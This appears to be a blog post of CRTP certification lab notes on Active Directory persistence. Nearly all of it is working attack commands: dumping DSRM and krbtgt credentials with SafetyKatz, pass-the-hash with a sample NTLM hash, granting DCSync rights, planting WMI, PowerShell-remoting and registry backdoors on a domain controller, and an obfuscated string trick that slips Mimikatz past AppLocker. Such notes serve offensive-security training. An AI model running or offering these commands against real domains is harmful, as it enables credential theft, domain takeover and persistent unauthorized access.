---
title: "Persistance"
date: 2025-03-27 10:02:00 +0000
categories: [Certifications Technical Notes, Certified Red Team Professional (CRTP)]
tags: [active directory attacks, offensive security]
---

## DSRM

1. Dump DSRM admin account hash
```powershell
    C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```

2. Add rule to DSRM account so we can remotely connect to DC using it
```powershell
    reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

3. Using PTH to get a session as DSRM admin account
```powershell
    C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```

4. Modify trusted hosts in student VM so we can use powershell remoting using IP @ and NTLM hash ('NegotiateWithImplicitCredential')
```powershell
    Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```

5. Modify registry keys to bypass PowerShell execution restrictions
```powershell
    C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

6. Connect to DC using Administrator account via PSSession
```powershell
    Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

---

## Add replication rights (DCSync)

1. First we are going to check for DCSync with student via PowerView
```powershell
    Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student486"}
```

2. Open cmd with svcadmin TGT
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

3. Bypass Powershell execution defense and Import PowerView then add DCSync to student account
```powershell
    Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

4. Now we can dump krbtgt keys using our student account while we have DCSync
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---

## Security Descriptors

1. Import tools
```powershell
    C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
    . C:\AD\Tools\RACE.ps1
```

2. Modify the host security descriptors for WMI on the DC
```powershell
    Set-RemoteWMI -SamAccountName student486 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

3. Execute WMI queries on the DC as student486
```powershell
    gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

---

### Modification to PowerShell remoting configuration

1. Use RACE.ps1 to add student account
```powershell
    Set-RemotePSRemoting -SamAccountName student486 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

2. Now we can execute commands using PS Remoting without DA privileges
```powershell
    Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

---

### Modify registries to add backdoor and to retrieve machine account hash with DA

1. Use RACE.ps1
```powershell
    Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student486 -Verbose
```

2. Now we can retrieve the DC machine hash without DA privileges
```powershell
    Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

---

## Gaps in Applocker Policy

1. Checking registry keys
```powershell
    reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 #allowed execution methods

    reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d #digging into this particular rule
```

2. Check the current language mode (restricted vs full privileges), FullLanguage (unrestricted) and ConstrainedLanguage (restricted)
```powershell
    #check language mode
    $ExecutionContext.SessionState.LanguageMode
    #check applocker policy
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

3. Edit Invoke-MimiEx-keys-stdx.ps1
```powershell
    #we appended this code into Invoke-Mimi.ps1
    $8 = "s";
    $c = "e";
    $g = "k";
    $t = "u";
    $p = "r";
    $n = "l";
    $7 = "s";
    $6 = "a";
    $l = ":";
    $2 = ":";
    $z = "e";
    $e = "k";
    $0 = "e";
    $s = "y";
    $1 = "s";
    $Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
    Invoke-Mimi -Command $Pwn
```

4. Copy this script into target filesystem
```powershell
    Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```